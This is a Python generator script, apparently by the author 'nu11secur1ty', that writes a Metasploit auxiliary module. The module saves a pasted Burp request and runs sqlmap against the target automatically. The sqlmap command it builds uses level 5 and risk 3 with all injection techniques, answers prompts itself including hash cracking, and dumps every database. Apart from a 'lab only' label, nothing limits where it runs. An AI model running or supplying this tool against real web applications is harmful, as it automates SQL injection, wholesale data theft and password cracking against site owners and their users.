#!/usr/bin/env python3
"""
msf_rb_generator.py

Generate a Metasploit auxiliary .rb module that saves RAW_REQUEST to a writable temp file
and runs sqlmap-nu11secur1ty automatically (lab-only). Also saves the pasted Burp request
to exploit.txt locally and can copy both files into an MSF modules directory if requested.

Author: Generated for nu11secur1ty
"""

from string import Template
import os
import shutil
import sys

MODULE_TEMPLATE = Template(r"""##
# $module_file
#
# Author: $author
# Description: $description
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      'Name'        => '$rb_name',
      'Description' => '$description',
      'Author'      => ['$author'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('RAW_REQUEST', [ true, 'Raw HTTP request (from Burp)', '' ]),
        OptString.new('SQLMAP_PATH', [ false, 'Full path to sqlmap.py', '$sqlmap_default' ])
      ]
    )
  end

  def run
    raw_request = datastore['RAW_REQUEST']
    sqlmap_path = datastore['SQLMAP_PATH']

    if raw_request.nil? || raw_request.empty?
      print_error("RAW_REQUEST must be set (paste your Burp request or set RAW_REQUEST).")
      return
    end

    # Prepare a writable directory in the user's home
    exploit_dir = File.join(Dir.home, ".msf_exploits")
    Dir.mkdir(exploit_dir) unless Dir.exist?(exploit_dir)

    # Use a per-run temp filename to avoid collisions
    timestamp = Time.now.strftime("%Y%m%d%H%M%S")
    tmp_file = File.join(exploit_dir, "exploit_#{timestamp}.txt")

    begin
      File.open(tmp_file, "w") { |f| f.write(raw_request) }
      print_good("Saved RAW_REQUEST -> #{tmp_file}")
    rescue Errno::EACCES => e
      print_error("Cannot write exploit file: #{e}. Use a writable directory.")
      return
    rescue => e
      print_error("Failed to save request: #{e}")
      return
    end

    # Ensure sqlmap exists
    unless File.exist?(sqlmap_path)
      print_error("sqlmap.py not found at #{sqlmap_path}. Set SQLMAP_PATH option to correct path.")
      return
    end

    # Build the sqlmap command exactly as requested.
    sqlmap_cmd = [
      "python3",
      sqlmap_path,
      "-r", tmp_file,
      "--no-cast",
      "--no-escape",
      "--dbms=mysql",
      "--time-sec=11",
      "--random-agent",
      "--level=5",
      "--risk=3",
      "--batch",
      "--flush-session",
      "--technique=TBEUSQ",
      "--union-char=UCHAR",
      '--answers="crack=Y,dict=Y,continue=Y,quit=N"',
      "--dump-all"
    ].join(" ")

    print_status("Executing sqlmap: #{sqlmap_cmd}")

    begin
      system(sqlmap_cmd)
      print_good("sqlmap finished (check output above).")
    rescue => e
      print_error("Failed to execute sqlmap: #{e}")
    ensure
      begin
        File.delete(tmp_file) if File.exist?(tmp_file)
        print_status("Deleted temporary file #{tmp_file}")
      rescue => e
        print_warning("Could not delete temporary file: #{e}")
      end
    end
  end
end
""")

def ensure_rb(filename):
    f = filename.strip()
    if not f.lower().endswith('.rb'):
        f = f + '.rb'
    return os.path.basename(f)

def write_file(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as fh:
            fh.write(data)
        return True
    except Exception as e:
        print(f"[!] Failed to write {path}: {e}")
        return False

def generate(output_file, rb_name, author, description, sqlmap_default, raw_request, msf_dir=None):
    module_file = ensure_rb(output_file)
    rb_basename = os.path.splitext(module_file)[0]

    content = MODULE_TEMPLATE.substitute(
        module_file=module_file,
        rb_name=rb_name or rb_basename,
        author=author,
        description=description,
        sqlmap_default=sqlmap_default
    )

    # Write .rb and exploit.txt to current directory
    out_rb = os.path.join(os.getcwd(), module_file)
    out_exploit = os.path.join(os.getcwd(), 'exploit.txt')

    if not write_file(out_rb, content):
        return
    if not write_file(out_exploit, raw_request):
        return

    print(f"[+] Wrote module: {out_rb}")
    print(f"[+] Wrote exploit.txt: {out_exploit}")

    # Optionally copy to MSF dir
    if msf_dir:
        if not os.path.isdir(msf_dir):
            print(f"[!] MSF directory does not exist: {msf_dir}")
            return
        try:
            shutil.copy2(out_rb, os.path.join(msf_dir, module_file))
            shutil.copy2(out_exploit, os.path.join(msf_dir, 'exploit.txt'))
            print(f"[+] Copied {module_file} and exploit.txt to {msf_dir}")
        except PermissionError:
            print("[!] Permission denied copying files to MSF dir — try running generator with sudo or copy manually:")
            print(f"    sudo cp {out_rb} {msf_dir}")
            print(f"    sudo cp {out_exploit} {msf_dir}")
        except Exception as e:
            print(f"[!] Failed to copy files to MSF dir: {e}")

def main():
    print("=== MSF .rb Module Generator (auto-sqlmap) ===")
    output_file = input("Enter output .rb filename (e.g., sacco_auto_sqlmap.rb): ").strip()
    if output_file == '':
        print("[!] No filename entered. Exiting.")
        sys.exit(1)
    output_file = ensure_rb(output_file)

    rb_name = input("Enter module 'Name' (example shown in module) [default uses filename base]: ").strip()
    author = input("Enter author name [default: nu11secur1ty]: ").strip() or "nu11secur1ty"
    description = input("Enter module description: ").strip() or "Save RAW_REQUEST and run sqlmap automatically (lab only)."
    sqlmap_default = input("Enter default SQLMAP_PATH (full path to sqlmap.py) [/home/kali/sqlmap-nu11secur1ty/sqlmap.py]: ").strip() or "/home/kali/sqlmap-nu11secur1ty/sqlmap.py"

    print("\nPaste your Burp request (full HTTP request). End with a single line containing only END.\n")
    lines = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip() == "END":
            break
        lines.append(line)
    raw_request = '\n'.join(lines)

    print("\nOptional: enter MSF module directory to copy generated files into (or press Enter to skip).")
    print("Example system path: /usr/share/metasploit-framework/modules/auxiliary/MSF/")
    msf_dir = input("MSF module dir (optional): ").strip()
    if msf_dir == '':
        msf_dir = None

    generate(output_file, rb_name, author, description, sqlmap_default, raw_request, msf_dir)

if __name__ == '__main__':
    main()
